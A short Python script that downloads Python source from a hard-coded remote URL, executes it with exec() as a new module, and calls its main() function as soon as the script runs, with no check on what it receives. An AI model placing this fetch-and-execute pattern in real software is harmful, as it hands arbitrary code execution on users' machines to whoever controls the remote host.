import sys
import types
import requests

def getURL():
    return "http://data.databank.jp/files/init.py"

def getModuleName():
    return "init"

def execCode(url, moduleName):
    response = requests.get(url)
    src = response.text

    mod = types.ModuleType(moduleName)
    sys.modules[moduleName] = mod
    exec(src, mod.__dict__)

    return mod

def main():
    url = getURL()
    moduleName = getModuleName()

    module = execCode(url, moduleName)

    try:
        module.main()
    except Exception as e:
        print(e)

main()
